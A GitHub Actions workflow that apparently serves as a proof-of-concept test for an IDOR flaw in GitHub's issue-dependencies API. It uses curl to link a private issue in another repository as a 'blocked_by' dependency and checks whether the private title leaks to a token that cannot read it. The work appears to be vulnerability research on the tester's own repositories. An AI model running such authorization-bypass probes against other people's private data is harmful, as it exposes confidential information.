name: idor-dep-test
on: { workflow_dispatch: {} }
permissions:
  issues: write
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: dependencies IDOR test (si-parent-scoped token vs si-child PRIVATE issue)
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          API="X-GitHub-Api-Version: 2026-03-10"
          echo "===STEP1: can this si-parent-scoped token READ si-child PRIVATE issue? (expect 404/403 = no access)==="
          curl -s -o /tmp/r1 -w "HTTP=%{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" -H "$API" https://api.github.com/repos/jackpas23/si-child/issues/1
          echo "body: $(head -c 160 /tmp/r1)"
          echo ""
          echo "===STEP2: POST si-child issue (global id 4661219265) as blocked_by of si-parent #1==="
          curl -s -o /tmp/r2 -w "HTTP=%{http_code}\n" -X POST -H "Authorization: Bearer $GH_TOKEN" -H "$API" -H "Content-Type: application/json" https://api.github.com/repos/jackpas23/si-parent/issues/1/dependencies/blocked_by -d '{"issue_id": 4661219265}'
          echo "body: $(head -c 400 /tmp/r2)"
          echo ""
          echo "===STEP3: GET blocked_by — does it LEAK CHILD-SECRET-TITLE to a token that cannot read si-child?==="
          curl -s -o /tmp/r3 -w "HTTP=%{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" -H "$API" https://api.github.com/repos/jackpas23/si-parent/issues/1/dependencies/blocked_by
          echo "body: $(head -c 800 /tmp/r3)"
          echo ""
          if grep -qi "CHILD-SECRET-TITLE" /tmp/r2 /tmp/r3 2>/dev/null; then echo "[IMPACT] IDOR CONFIRMED: private si-child title leaked to si-parent-scoped token"; else echo "[RESULT] No leak — read-check enforced (404/403-mask) = hardened"; fi
